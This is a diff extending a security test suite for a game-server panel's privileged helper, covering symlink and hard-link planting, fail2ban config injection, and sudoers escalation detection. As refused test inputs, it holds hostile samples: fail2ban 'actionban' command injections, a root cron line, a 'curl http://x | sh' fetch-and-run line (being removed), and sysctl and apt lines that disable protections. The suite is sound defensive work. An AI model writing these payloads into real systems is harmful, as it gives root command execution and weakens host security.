@@ -1584,6 +1584,148 @@ check("db repair: ...to a healthy file", _dbr.integrity_check(_dbr_db)[0], "not 
 check("db repair: ...leaving no .restoring temp behind",
       not os.path.exists(_dbr_db + ".restoring"))
 
+# The names repair() CREATES beside the database are just as plantable as the two it reads. The
+# aside copy was `<db>.corrupt-<unix time>` written with shutil.copy2, which follows a symlink at
+# its destination, so one link per second of the window (all aimed at a root path) made root write
+# panel.db's bytes there — with no corruption needed, because the aside step is unconditional.
+# `.restoring` and `.rebuilt` had the same shape, and _silent_rm kept a DANGLING link in place
+# because os.path.exists() follows it. Planted here as real links; the targets must never appear.
+import time as _dbr_time                                                           # noqa: E402
+_dbr_pl = _tempfile.mkdtemp(prefix="dbrepair-plant-")
+_dbr_pl_db = os.path.join(_dbr_pl, "panel.db")
+_dbr_pl_bak = _dbr_pl_db + ".backup"
+_dbr_pl_tgt = {k: os.path.join(_dbr_pl, "root-owned-" + k) for k in ("aside", "restoring", "rebuilt")}
+with open(_dbr_pl_db, "wb") as _fh:
+    _fh.write(b"* * * * * root id > /tmp/pwned\n")
+_dbr_now = int(_dbr_time.time())
+for _t in range(_dbr_now - 2, _dbr_now + 30):
+    os.symlink(_dbr_pl_tgt["aside"], "%s.corrupt-%d" % (_dbr_pl_db, _t))
+_dbr_aside = _dbr._aside(_dbr_pl_db)
+check("db repair: the aside copy never writes through a planted symlink",
+      not os.path.exists(_dbr_pl_tgt["aside"]), "the link's target was created")
+_dbr_aside_bytes = b""
+if _dbr_aside and not os.path.islink(_dbr_aside):
+    with open(_dbr_aside, "rb") as _fh:
+        _dbr_aside_bytes = _fh.read()
+check("db repair: ...and still makes the aside copy, as a real file of the database's bytes",
+      _dbr_aside_bytes == b"* * * * * root id > /tmp/pwned\n", repr(_dbr_aside))
+# Now the two temps, through a whole repair: a corrupt database and a healthy, fuller backup, so
+# both the rebuild branch and the restore branch run.
+_dbr_c = _dbr_sqlite.connect(_dbr_pl_bak)
+_dbr_c.execute("create table t(x)")
+_dbr_c.executemany("insert into t values(?)", [("row%d" % _i,) for _i in range(50)])
+_dbr_c.commit()
+_dbr_c.close()
+os.symlink(_dbr_pl_tgt["restoring"], _dbr_pl_db + ".restoring")
+os.symlink(_dbr_pl_tgt["rebuilt"], _dbr_pl_db + ".rebuilt")
+_dbr_pl_ok, _dbr_pl_msg = _dbr.repair(path=_dbr_pl_db, backup=_dbr_pl_bak)
+check("db repair: a planted .restoring link is not written through",
+      not os.path.exists(_dbr_pl_tgt["restoring"]), _dbr_pl_msg)
+check("db repair: a planted .rebuilt link is not written through",
+      not os.path.exists(_dbr_pl_tgt["rebuilt"]), _dbr_pl_msg)
+check("db repair: ...and the repair still restores a healthy, real database file",
+      _dbr_pl_ok is True and not os.path.islink(_dbr_pl_db)
+      and _dbr.integrity_check(_dbr_pl_db)[0], _dbr_pl_msg)
+
+# Refusing a link at each name is not enough on its own: sqlite opens the database, its -wal and
+# its -shm companions following links, and a name checked a moment ago can be swapped before use.
+# So as ROOT, main() pins the database's directory by descriptor and becomes the account that owns
+# it before any file work — for every command, since install.sh's update step runs this as root
+# too. Driven through main() with the euid and the drop stubbed on the module.
+import pwd as _dbr_pwd                                                             # noqa: E402
+_dbr_cf = _tempfile.mkdtemp(prefix="dbrepair-confine-")
+_dbr_cf_db = os.path.join(_dbr_cf, "panel.db")
+with open(_dbr_cf_db, "wb") as _fh:
+    _fh.write(b"not a database")
+_dbr_c = _dbr_sqlite.connect(_dbr_cf_db + ".backup")
+_dbr_c.execute("create table t(x)")
+_dbr_c.execute("insert into t values(1)")
+_dbr_c.commit()
+_dbr_c.close()
+os.symlink(_dbr_cf, _dbr_cf + "-link")
+_dbr_o = (_dbr._euid, _dbr._become, _dbr.repair, _dbr._reclaim_db_files)
+_dbr_became, _dbr_repaired, _dbr_reclaimed = [], [], []
+_dbr_cwd = os.getcwd()
+try:
+    _dbr._euid = lambda: 0
+    _dbr._become = lambda uid, gid: _dbr_became.append((uid, gid))
+    _dbr._reclaim_db_files = lambda fd, name, uid, gid: (
+        _dbr_reclaimed.append((name, uid, list(_dbr_became))), _dbr_o[3](fd, name, uid, gid))
+    _dbr_rc = _dbr.main(["db_maintenance.py", "repair", _dbr_cf_db])
+    os.chdir(_dbr_cwd)
+    check("db repair as root: main() drops to the database directory's owner first",
+          _dbr_became == [(os.getuid(), _dbr_pwd.getpwuid(os.getuid()).pw_gid)], repr(_dbr_became))
+    check("db repair as root: ...after handing the database's own files back to that owner",
+          _dbr_reclaimed == [("panel.db", os.getuid(), [])], repr(_dbr_reclaimed))
+    check("db repair as root: ...and the repair still works from inside that directory",
+          _dbr_rc == 0 and _dbr.integrity_check(_dbr_cf_db)[0], "rc=%r" % _dbr_rc)
+    _dbr.repair = lambda p, b: (_dbr_repaired.append(p), (True, ""))[1]
+    del _dbr_became[:]
+    _dbr_rc = _dbr.main(["db_maintenance.py", "repair", os.path.join(_dbr_cf + "-link", "panel.db")])
+    os.chdir(_dbr_cwd)
+    check("db repair as root: a symlinked database directory is refused, and nothing runs",
+          _dbr_rc == 1 and not _dbr_repaired and not _dbr_became,
+          "rc=%r repaired=%r became=%r" % (_dbr_rc, _dbr_repaired, _dbr_became))
+    if os.stat("/").st_uid == 0 and not os.stat("/").st_mode & 0o022:
+        _dbr_rc = _dbr.main(["db_maintenance.py", "repair", "/panel-db-that-is-not-there.db"])
+        os.chdir(_dbr_cwd)
+        check("db repair as root: a root-owned directory is worked in as root (no drop)",
+              _dbr_rc == 0 and not _dbr_became and _dbr_repaired == ["panel-db-that-is-not-there.db"],
+              "rc=%r repaired=%r became=%r" % (_dbr_rc, _dbr_repaired, _dbr_became))
+    else:
+        skip("db repair as root: a root-owned directory is worked in as root (no drop)",
+             "/ is not a root-owned, non-writable directory here")
+    _tmp_st = os.stat("/tmp")
+    if _tmp_st.st_uid == 0 and _tmp_st.st_mode & 0o002:
+        del _dbr_repaired[:]
+        _dbr_rc = _dbr.main(["db_maintenance.py", "repair", "/tmp/panel-db-that-is-not-there.db"])
+        os.chdir(_dbr_cwd)
+        check("db repair as root: a root-owned directory others can write is refused",
+              _dbr_rc == 1 and not _dbr_repaired and not _dbr_became,
+              "rc=%r repaired=%r became=%r" % (_dbr_rc, _dbr_repaired, _dbr_became))
+    else:
+        skip("db repair as root: a root-owned directory others can write is refused",
+             "/tmp is not a root-owned world-writable directory here")
+finally:
+    os.chdir(_dbr_cwd)
+    _dbr._euid, _dbr._become, _dbr.repair, _dbr._reclaim_db_files = _dbr_o
+
+# What that reclaim hands over, and what it must not. A database an earlier root-run repair left
+# root-owned is given back, so the drop does not turn it into an update that aborts on a file the
+# owner cannot open — but only a regular file with ONE link, opened O_NOFOLLOW: a symlink or a
+# second hard link would make root give away some other file. fchown is stubbed (this suite is not
+# root); what it is called on is the evidence.
+_dbr_rc_dir = _tempfile.mkdtemp(prefix="dbrepair-reclaim-")
+for _n in ("panel.db", "panel.db.backup", "elsewhere", "other-file"):
+    with open(os.path.join(_dbr_rc_dir, _n), "wb") as _fh:
+        _fh.write(b"x")
+os.link(os.path.join(_dbr_rc_dir, "elsewhere"), os.path.join(_dbr_rc_dir, "panel.db-wal"))
+os.symlink(os.path.join(_dbr_rc_dir, "other-file"), os.path.join(_dbr_rc_dir, "panel.db-shm"))
+_dbr_ino = {_n: os.lstat(os.path.join(_dbr_rc_dir, _n)).st_ino
+            for _n in ("panel.db", "panel.db.backup", "elsewhere", "other-file")}
+_dbr_chowned = []
+_dbr_o_fchown = _dbr.os.fchown
+_dbr_rfd = os.open(_dbr_rc_dir, os.O_RDONLY | os.O_DIRECTORY)
+try:
+    _dbr.os.fchown = lambda fd, uid, gid: _dbr_chowned.append((os.fstat(fd).st_ino, uid))
+    _dbr._reclaim_db_files(_dbr_rfd, "panel.db", os.getuid() + 4242, 4242)
+    _dbr_other = list(_dbr_chowned)
+    del _dbr_chowned[:]
+    _dbr._reclaim_db_files(_dbr_rfd, "panel.db", os.getuid(), 4242)
+    _dbr_same = list(_dbr_chowned)
+finally:
+    _dbr.os.fchown = _dbr_o_fchown
+    os.close(_dbr_rfd)
+check("db repair as root: the database and its backup are handed back to the directory's owner",
+      sorted(_dbr_other) == sorted([(_dbr_ino["panel.db"], os.getuid() + 4242),
+                                    (_dbr_ino["panel.db.backup"], os.getuid() + 4242)]),
+      repr(_dbr_other))
+check("db repair as root: ...never a hard-linked or symlinked member's other file",
+      not any(_i in (_dbr_ino["elsewhere"], _dbr_ino["other-file"]) for _i, _u in _dbr_other),
+      repr(_dbr_other))
+check("db repair as root: ...and nothing already owned by that account is touched",
+      _dbr_same == [], repr(_dbr_same))
+
 
 # ── The root dependency install must not take package names from a panel-writable file ────────
 # install_game_dependencies interpolates its package list BARE into a pipeline it runs with
@@ -1938,35 +2080,114 @@ try:
     check("helper gmod-mount-read: a readable mount.cfg still reports success and its contents",
           _cs_rc_ok == 0 and _cs_out2 == '"cstrike" "/home/cu/serverfiles/cstrike"\n',
           "rc=%s out=%r" % (_cs_rc_ok, _cs_out2))
+
+    # 5. content-game-remove: three shutil.rmtree calls as root on paths content_path() built as
+    #    STRINGS. rmtree's symlink guard covers the last component only, and the account owns its
+    #    home — so `ln -s /home/<another box>/serverfiles ~/serverfiles` (or the same for ~/lgsm)
+    #    had root delete another tenant's content. Both intermediate links are planted here, aimed
+    #    at directories outside the home holding the exact names the verb removes.
+    _cs_other = os.path.join(_cs_tmp, "otherbox")
+    os.makedirs(os.path.join(_cs_other, "serverfiles", "cstrike", "maps"))
+    os.makedirs(os.path.join(_cs_other, "lgsm", "config-lgsm", "cssserver"))
+    with open(os.path.join(_cs_other, "serverfiles", "cstrike", "maps", "keep.bsp"), "w") as _fh:
+        _fh.write("x")
+    os.rename(_cs_sf, _cs_sf + ".real")
+    os.symlink(os.path.join(_cs_other, "serverfiles"), _cs_sf)
+    os.symlink(os.path.join(_cs_other, "lgsm"), os.path.join(_cs_home, "lgsm"))
+    _helper.do_content_game_remove([_cs_me, "cstrike", "cssserver"], "")
+    check("helper content-game-remove: a symlinked ~/serverfiles is not followed out of the home",
+          os.path.isfile(os.path.join(_cs_other, "serverfiles", "cstrike", "maps", "keep.bsp")),
+          "the other box's content was deleted")
+    check("helper content-game-remove: ...nor a symlinked ~/lgsm",
+          os.path.isdir(os.path.join(_cs_other, "lgsm", "config-lgsm", "cssserver")),
+          "the other box's LinuxGSM config was deleted")
+    check("helper content-game-remove: ...and the links themselves are left, not replaced",
+          os.path.islink(_cs_sf) and os.path.islink(os.path.join(_cs_home, "lgsm")))
+    # Positive control: the real layout is still removed — content tree, script, config — or the
+    # checks above would pass against a verb that deletes nothing.
+    os.unlink(_cs_sf)
+    os.unlink(os.path.join(_cs_home, "lgsm"))
+    os.rename(_cs_sf + ".real", _cs_sf)
+    os.makedirs(os.path.join(_cs_home, "lgsm", "config-lgsm", "cssserver", "sub"))
+    with open(os.path.join(_cs_home, "cssserver"), "w") as _fh:
+        _fh.write("#!/bin/bash\n")
+    os.symlink(_cs_other, os.path.join(_cs_sf, "cstrike", "maps", "escape"))
+    _helper.do_content_game_remove([_cs_me, "cstrike", "cssserver"], "")
+    check("helper content-game-remove: the real content, script and config are all removed",
+          not os.path.lexists(os.path.join(_cs_sf, "cstrike"))
+          and not os.path.lexists(os.path.join(_cs_home, "cssserver"))
+          and not os.path.lexists(os.path.join(_cs_home, "lgsm", "config-lgsm", "cssserver"))
+          and os.path.isdir(os.path.join(_cs_home, "lgsm", "config-lgsm")),
+          repr(os.listdir(_cs_home)))
+    check("helper content-game-remove: ...a link INSIDE the tree is removed as a link, not followed",
+          os.path.isfile(os.path.join(_cs_other, "serverfiles", "cstrike", "maps", "keep.bsp")))
+
+    # 6. content-grant-read had the same shape: fwalk started from the PATH .../serverfiles/<game>,
+    #    and fwalk's own check covers the last component only — so a symlinked ~/serverfiles had
+    #    root `chmod g+rX` another tenant's game tree for the content group to read.
+    _cs_o2 = os.path.join(_cs_tmp, "otherbox2")
+    os.makedirs(os.path.join(_cs_o2, "serverfiles", "cstrike", "cfg"))
+    _cs_o2_file = os.path.join(_cs_o2, "serverfiles", "cstrike", "cfg", "rcon.cfg")
+    with open(_cs_o2_file, "w", encoding="utf-8") as _fh:
+        _fh.write("rcon_password secret\n")
+    os.chmod(_cs_o2_file, 0o600)
+    os.chmod(os.path.join(_cs_o2, "serverfiles", "cstrike"), 0o700)
+    os.rename(_cs_sf, _cs_sf + ".real2")
+    os.symlink(os.path.join(_cs_o2, "serverfiles"), _cs_sf)
+    _cs_grpname = _cs_grp.getgrgid(__import__("pwd").getpwnam(_cs_me).pw_gid).gr_name
+    _helper.do_content_grant_read([_cs_me, _cs_grpname, _cs_me, "cstrike"], "")
+    check("helper content-grant-read: a symlinked ~/serverfiles is not walked into another tree",
+          _cs_stat.S_IMODE(os.stat(_cs_o2_file).st_mode) == 0o600
+          and _cs_stat.S_IMODE(os.stat(os.path.join(_cs_o2, "serverfiles", "cstrike")).st_mode)
+          == 0o700,
+          "file=%s dir=%s" % (oct(_cs_stat.S_IMODE(os.stat(_cs_o2_file).st_mode)),
+                              oct(_cs_stat.S_IMODE(os.stat(
+                                  os.path.join(_cs_o2, "serverfiles", "cstrike")).st_mode))))
+    os.unlink(_cs_sf)
+    os.rename(_cs_sf + ".real2", _cs_sf)
 finally:
     _helper.HOME_ROOT, _helper.CONTENT_CRON_PREFIX = _cs_saved_root, _cs_saved_cron
     _shutil.rmtree(_cs_tmp, ignore_errors=True)
 
-# ── fail2ban's two runnable keys ──────────────────────────────────────────────────────────────
-# These four write targets were allowed wholesale, on the reasoning that fail2ban config is
-# declarative and the COMMANDS live in action.d/*.conf, which is not a write target. Two keys
-# undercut that: a jail's `action` names a definition that fail2ban resolves by joining the value
-# onto "action.d", and filter.d/linuxgsm-panel.conf IS a write target — so `action =
-# ../filter.d/linuxgsm-panel` may load a file the caller just wrote, whose actionstart/actionban
-# fail2ban runs as root on reload. I could not verify that traversal (no fail2ban here to test
-# against), so this is a guard against a maybe — and it costs nothing, because the panel writes
-# none of these keys and a legitimate value is a bare name.
+# ── fail2ban: what may be written into a jail or filter file ─────────────────────────────────
+# The four fail2ban write targets were validated one STRIPPED line at a time against a denylist of
+# two "runnable" keys (action*/banaction*, filter, chain: bare names only), everything else
+# accepted. fail2ban runs things as root on ban and on reload, and three shapes walked past that:
+#   * an INDENTED line continues the previous value in configparser, and `action` is multi-line —
+#     the strip() erased the indent, so a second action with an inline `actionban=<cmd>` override
+#     was checked as a line with no `=` and accepted;
+#   * jail values are substituted unescaped into shell commands (<port> in iptables-multiport's
+#     actionstart), and jail.conf's default action interpolates `%(port)s` into
+#     `banaction[port="..."]`, so `port = ssh", actionban="<cmd>` reopened the override;
+#   * `ignorecommand` (run by fail2ban itself) and [INCLUDES] before/after were never on the list.
+# It is an allowlist of the sections and keys the panel writes now, checked over the whole file.
 _helper_src = open(_helper_path, encoding="utf-8").read()
-_f2b_bad = [ln for ln in ("action = ../filter.d/linuxgsm-panel", "banaction = /tmp/evil",
-                          "actionban = curl http://x | sh", "actionstart = /bin/sh -c id",
-                          "banactionallports = ../../x", "filter = ../../etc/passwd",
-                          "chain = ../x")
-            if _helper._fail2ban_line_ok(ln)]
-check("helper fail2ban: a value that names a path is refused for the keys that decide what RUNS",
-      not _f2b_bad, "accepted: %s" % _f2b_bad)
-_f2b_good = [ln for ln in ("action = iptables-multiport", "filter = linuxgsm-panel",
-                           "action_mwl = sendmail-whois-lines", "[linuxgsm-panel]",
-                           "enabled = true", "ignoreip = 127.0.0.1/8 ::1 10.0.0.0/8",
-                           "logpath = /var/log/auth.log",
-                           "failregex = panel login (?:failed|blocked) from <HOST>$")
-             if not _helper._fail2ban_line_ok(ln)]
-check("helper fail2ban: ...and every other key, paths and regexes included, is untouched",
-      not _f2b_good, "refused: %s" % _f2b_good)
+_F2B_ROOT = [
+    ("fail2ban-jail-local",
+     "[sshd]\nenabled = true\naction = iptables-multiport\n    sendmail[actionban=/bin/false ; reboot]\n"),
+    ("fail2ban-jail-local", "[DEFAULT]\nbanaction = iptables\n   mail[actionban=id>/tmp/x]\n"),
+    ("fail2ban-jail-local", '[sshd]\nenabled = true\nport = ssh", actionban="touch /tmp/pwned\n'),
+    ("fail2ban-jail-local", "[sshd]\nport = 22; touch /tmp/pwned\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\nignorecommand = /bin/sh -c id\n"),
+    ("fail2ban-panel-jail", "[INCLUDES]\nbefore = /home/lgsmpanel/evil.conf\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\nlogpath = /var/log/x; id\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\naction = ../filter.d/linuxgsm-panel\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\nport = %(evil)s\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\naction: sendmail[actionban=id]\n"),
+    ("fail2ban-panel-jail", "[linuxgsm-panel]\nfilter = linuxgsm-panel\x0cignorecommand = id\n"),
+    ("fail2ban-panel-whitelist", "ignoreip = 10.0.0.1\n"),                    # before any section
+    ("fail2ban-panel-whitelist", "[DEFAULT]\nignoreip = 127.0.0.1/8 ::1%eth0\n"),
+    ("fail2ban-panel-filter", "[Definition]\nactionban = touch /tmp/pwned\n"),
+    ("fail2ban-panel-filter", "[Definition]\nfailregex = x\n    <HOST>\n"),
+]
+_f2b_bad = [(n, b[:48]) for n, b in _F2B_ROOT
+            if _helper._content_ok(b, _helper.WRITE_CONTENT[n])]
+check("helper fail2ban: a continuation, an injected action, ignorecommand, INCLUDES and "
+      "interpolation are all refused", not _f2b_bad, "accepted: %s" % _f2b_bad)
+check("helper fail2ban: ...and the write verb consults that whole-file rule, not a per-line one",
+      all(isinstance(_helper.WRITE_CONTENT[n], _helper._WholeFile)
+          for n in ("fail2ban-jail-local", "fail2ban-panel-whitelist",
+                    "fail2ban-panel-filter", "fail2ban-panel-jail")))
 # The bodies the PANEL actually sends have to pass, or the feature is simply broken.
 from panel.ops.ssh_manager import hosts as _f2b_hosts                              # noqa: E402
 _F2B_BODIES = {
@@ -1978,7 +2199,7 @@ _F2B_BODIES = {
 }
 _f2b_rejected = [n for n, b in _F2B_BODIES.items()
                  if _helper.WRITE_CONTENT[n] is None
-                 or not _helper._lines_match(b, _helper.WRITE_CONTENT[n])]
+                 or not _helper._content_ok(b, _helper.WRITE_CONTENT[n])]
 check("helper fail2ban: every body the panel writes is still accepted", not _f2b_rejected,
       "rejected: %s" % _f2b_rejected)
 
@@ -2065,9 +2286,60 @@ check("helper restore: a real staged file IS still copied (positive control)",
       "config.json" in _rs_ok and os.path.isfile(_rs_dst)
       and open(_rs_dst, encoding="utf-8").read() == "{\"real\": true}",
       "copied=%s" % (_rs_ok,))
-check("helper restore: ...and it keeps the staged file's mode",
+check("helper restore: ...at mode 0600",
       _rs_stat.S_IMODE(os.stat(_rs_dst).st_mode) == 0o600,
       oct(_rs_stat.S_IMODE(os.stat(_rs_dst).st_mode)))
+
+# 3b. The mode and owner are the helper's to set, never the staged file's. It ran
+#     fchmod(S_IMODE(staged mode)) — set-id bits included — on a file ROOT had just created, and
+#     never chowned it: a member missing before the restore came back root-owned with whatever bits
+#     the panel user staged. Staged 04755 onto a missing destination here; the result must be 0600
+#     and owned by the data directory's owner. (This suite is not root, so the owner is also the
+#     caller — the fchown is observed through a stub to prove it is asked for, with the dir's ids.)
+with open(os.path.join(_rs_stage, "cred_key"), "w", encoding="utf-8") as _fh:
+    _fh.write("KEY")
+os.chmod(os.path.join(_rs_stage, "cred_key"), 0o4755)
+_rs_chown = []
+_rs_o_fchown = _helper.os.fchown
+try:
+    _helper.os.fchown = lambda fd, u, g: (_rs_chown.append((u, g)), _rs_o_fchown(fd, u, g))
+    _rs_setid = _helper.restore_copy_members(_rs_stage, _rs_data)
+finally:
+    _helper.os.fchown = _rs_o_fchown
+_rs_ck = os.path.join(_rs_data, "cred_key")
+check("helper restore: a staged set-id mode never reaches the restored file (it is 0600)",
+      "cred_key" in _rs_setid and _rs_stat.S_IMODE(os.stat(_rs_ck).st_mode) == 0o600,
+      "copied=%s mode=%s" % (_rs_setid, oct(_rs_stat.S_IMODE(os.stat(_rs_ck).st_mode))
+                             if os.path.exists(_rs_ck) else None))
+check("helper restore: ...and every restored member is chowned to the data directory's owner",
+      _rs_chown and set(_rs_chown) == {(os.stat(_rs_data).st_uid, os.stat(_rs_data).st_gid)},
+      repr(_rs_chown))
+
+# 3c. Hard links, which the copy had left to fs.protected_hardlinks — a sysctl, not something this
+#     code controls. A staged member with a second link is refused (that inode is also some other
+#     file), and a hard link AT the destination keeps its contents: the copy goes to a fresh temp
+#     and is renamed onto the name, so the old inode is never opened, let alone truncated.
+_rs_other = os.path.join(_rs_tmp, "other-file")
+with open(_rs_other, "w", encoding="utf-8") as _fh:
+    _fh.write("OTHER")
+os.unlink(os.path.join(_rs_stage, "cred_key"))
+os.link(_rs_other, os.path.join(_rs_stage, "cred_key"))
+check("helper restore: a hard-linked staged member is refused",
+      "cred_key" not in _helper.restore_copy_members(_rs_stage, _rs_data))
+os.unlink(os.path.join(_rs_stage, "cred_key"))
+with open(os.path.join(_rs_stage, "cred_key"), "w", encoding="utf-8") as _fh:
+    _fh.write("NEWKEY")
+os.unlink(_rs_ck)
+os.link(_rs_other, _rs_ck)
+_rs_hl = _helper.restore_copy_members(_rs_stage, _rs_data)
+check("helper restore: a hard link at the destination is not written through",
+      open(_rs_other, encoding="utf-8").read() == "OTHER",
+      repr(open(_rs_other, encoding="utf-8").read()))
+check("helper restore: ...and the member itself is restored (positive control)",
+      "cred_key" in _rs_hl and open(_rs_ck, encoding="utf-8").read() == "NEWKEY"
+      and os.stat(_rs_ck).st_nlink == 1, "copied=%s" % (_rs_hl,))
+check("helper restore: ...leaving no temp file behind in the data directory",
+      not [n for n in os.listdir(_rs_data) if ".restoring-" in n], repr(os.listdir(_rs_data)))
 
 # 4. A staging directory that is itself a symlink is refused outright.
 _rs_data2 = os.path.join(_rs_tmp, "data2")
@@ -2130,6 +2402,36 @@ for _k, _v in _ROOT_EXEC:
         _accepted_exec.append("%s: %s" % (_k, _v[:34]))
 check("helper: content that would execute as root is refused, and nothing is written",
       not _accepted_exec, "accepted: %s" % _accepted_exec)
+# Content that runs nothing but switches a protection off. The sysctl grammar was "any lowercase
+# key = digits" and the apt one "any APT:: key, numeric value": both admitted lines the panel never
+# sends, which turned host-wide kernel hardening off (persistently — sysctl.d is re-applied at
+# boot) or let apt install unsigned packages as root. fs.protected_hardlinks is the one the
+# helper's own restore copy used to lean on.
+_WEAKENING = [
+    ("sysctl-tailscale", "fs.protected_hardlinks = 0"),
+    ("sysctl-tailscale", "net.ipv4.ip_forward = 1\nfs.protected_symlinks=0"),
+    ("sysctl-tailscale", "kernel.yama.ptrace_scope = 0"),
+    ("sysctl-tailscale", "kernel.randomize_va_space = 0"),
+    ("apt-auto-upgrades", 'APT::Get::AllowUnauthenticated "1";'),
+    ("apt-auto-upgrades", 'APT::Periodic::Unattended-Upgrade "1";\nAPT::Sandbox::Verify "0";'),
+]
+_accepted_weak = []
+for _k, _v in _WEAKENING:
+    _rc, _written = _write_through_helper(_k, _v)
+    if _rc == 0 or _written is not None:
+        _accepted_weak.append("%s: %s" % (_k, _v[:40]))
+check("helper: a sysctl or apt key the panel never writes is refused (no protection switched off)",
+      not _accepted_weak, "accepted: %s" % _accepted_weak)
+_accepted_f2b = []
+for _k, _v in _F2B_ROOT:
+    _rc, _written = _write_through_helper(_k, _v)
+    if _rc == 0 or _written is not None:
+        _accepted_f2b.append("%s: %s" % (_k, _v[:40]))
+check("helper: write-file refuses a fail2ban body that would run a command as root",
+      not _accepted_f2b, "accepted: %s" % _accepted_f2b)
+_f2b_real_written = [_k for _k, _v in _F2B_BODIES.items() if _write_through_helper(_k, _v) != (0, _v)]
+check("helper: ...and still writes every fail2ban body the panel sends (positive control)",
+      not _f2b_real_written, "refused: %s" % _f2b_real_written)
 _rc_cron, _written_cron = _write_through_helper("node-tools-cron", "* * * * * root id > /tmp/pwned")
 check("helper: a hostile cron body is replaced by the helper's own, not written",
       _rc_cron == 0 and _written_cron == _helper.NODE_TOOLS_CRON_BODY,
@@ -3488,47 +3790,110 @@ class _FakeGrp:
         self.gr_name, self.gr_mem, self.gr_gid = name, list(mem), 1234
 
 
+_sudoers_saved = (_helper.SUDOERS_FILE, _helper.SUDOERS_DIR)
+import tempfile as _sg_tmp
+_sg_root = _sg_tmp.mkdtemp(prefix="sudoers-root-")
+_sg_main = os.path.join(_sg_root, "sudoers")
+with open(_sg_main, "w", encoding="utf-8") as _fh:
+    _fh.write("Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n")
+
+
+def _fake_grp(getgrgid, getgrall):
+    """A grp stand-in; getgrnam answers every group name with the same gid as _FakeGrp."""
+    return NS(getgrgid=getgrgid, getgrall=getgrall, getgrnam=lambda _n: _FakeGrp(_n))
+
+
 try:
+    # The real /etc/sudoers is root-only, and an unreadable policy now counts as "can escalate",
+    # so every check here reads a sandbox copy instead.
+    _helper.SUDOERS_FILE, _helper.SUDOERS_DIR = _sg_main, os.path.join(_sg_root, "none")
     _helper.glob = NS(glob=lambda _p: [])        # no sudoers.d to read in the unit environment
     _helper.pwd = NS(getpwnam=lambda _u: NS(pw_gid=1234, pw_uid=1234, pw_name=_u))
-    _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("gmodserver"),
-                     getgrall=lambda: [_FakeGrp("sudo", ["alice"]),
-                                       _FakeGrp("gmodcontent", ["gmodserver"])])
+    _helper.grp = _fake_grp(lambda _g: _FakeGrp("gmodserver"),
+                            lambda: [_FakeGrp("sudo", ["alice"]),
+                                     _FakeGrp("gmodcontent", ["gmodserver"])])
     check("enrolment: a plain game account can be enrolled",
           _helper._can_already_escalate("gmodserver") is False)
     check("enrolment: an account in the sudo group cannot",
           _helper._can_already_escalate("alice") is True)
     for _pg in ("admin", "wheel", "root"):
-        _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("users"),
-                         getgrall=lambda _p=_pg: [_FakeGrp(_p, ["bob"])])
+        _helper.grp = _fake_grp(lambda _g: _FakeGrp("users"),
+                                lambda _p=_pg: [_FakeGrp(_p, ["bob"])])
         check("enrolment: ...nor one in '%s'" % _pg,
               _helper._can_already_escalate("bob") is True)
     # A sudoers FILE naming the account directly, with no privileged group anywhere.
-    import tempfile as _sg_tmp
     _sg_dir = _sg_tmp.mkdtemp(prefix="sudoers-")
     with open(os.path.join(_sg_dir, "90-ops"), "w", encoding="utf-8") as _fh:
         _fh.write("# a comment naming gmodserver must not count\n"
                   "Defaults env_reset\n"
                   "carol ALL=(ALL) NOPASSWD:ALL\n")
     _helper.glob = NS(glob=lambda _p: [os.path.join(_sg_dir, "90-ops")])
-    _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("users"), getgrall=lambda: [])
+    _helper.grp = _fake_grp(lambda _g: _FakeGrp("users"), lambda: [])
     check("enrolment: an account named in a sudoers.d file cannot be enrolled",
           _helper._can_already_escalate("carol") is True)
     check("enrolment: ...but being MENTIONED in a comment there is not a grant",
           _helper._can_already_escalate("gmodserver") is False)
+
+    # Grants that do not put the account's own name first. The scan matched a sudoers line only when
+    # its FIRST token was literally the user or `%group`, so every one of these read as "cannot
+    # escalate" — the opposite of the docstring's own rule that what it cannot parse counts as yes:
+    # a User_Alias (resolved, and nested), a comma-separated user list, ALL, a `#uid` (the old
+    # `split("#")` threw the whole line away as a comment), `%#gid`, a grant in a file reached only
+    # through @include, a netgroup, and a policy file it could not read at all.
+    _sg_cases = {
+        "user-alias": "User_Alias OPS = deploy, alice\nOPS ALL=(ALL) NOPASSWD:ALL\n",
+        "nested-alias": "User_Alias INNER = deploy : OUTER = INNER, bob\nOUTER ALL=(ALL) ALL\n",
+        "user-list": "alice,deploy ALL=(ALL) ALL\n",
+        "user-list-spaced": "alice, deploy ALL=(ALL) ALL\n",
+        "all": "ALL ALL=(ALL) NOPASSWD: /usr/bin/id\n",
+        "uid": "#1234 ALL=(ALL) ALL\n",
+        "gid": "%#1234 ALL=(ALL) ALL\n",
+        "netgroup": "+admins ALL=(ALL) ALL\n",
+        "undefined-alias": "NOBODYKNOWS ALL=(ALL) ALL\n",
+        "continued": "alice,\\\n  deploy ALL=(ALL) ALL\n",
+    }
+    _sg_missed = []
+    for _case, _body in _sg_cases.items():
+        with open(os.path.join(_sg_dir, "90-ops"), "w", encoding="utf-8") as _fh:
+            _fh.write(_body)
+        if _helper._can_already_escalate("deploy") is not True:
+            _sg_missed.append(_case)
+    check("enrolment: a grant through an alias, a user list, ALL, #uid, %#gid, a netgroup or a "
+          "continuation line is seen", not _sg_missed, "missed: %s" % _sg_missed)
+    _sg_extra = os.path.join(_sg_root, "elsewhere")
+    with open(_sg_extra, "w", encoding="utf-8") as _fh:
+        _fh.write("deploy ALL=(ALL) NOPASSWD:ALL\n")
+    with open(os.path.join(_sg_dir, "90-ops"), "w", encoding="utf-8") as _fh:
+        _fh.write("@include %s\n" % _sg_extra)
+    check("enrolment: a grant in a file reached only through @include is seen",
+          _helper._can_already_escalate("deploy") is True)
+    with open(os.path.join(_sg_dir, "90-ops"), "w", encoding="utf-8") as _fh:
+        _fh.write("@include %s\n" % os.path.join(_sg_root, "no-such-file"))
+    check("enrolment: a policy file that cannot be read counts as 'can escalate'",
+          _helper._can_already_escalate("deploy") is True)
+    # Positive control: the same shapes naming OTHER accounts must still let a game account in,
+    # or the checks above pass against a function that refuses everyone.
+    with open(os.path.join(_sg_dir, "90-ops"), "w", encoding="utf-8") as _fh:
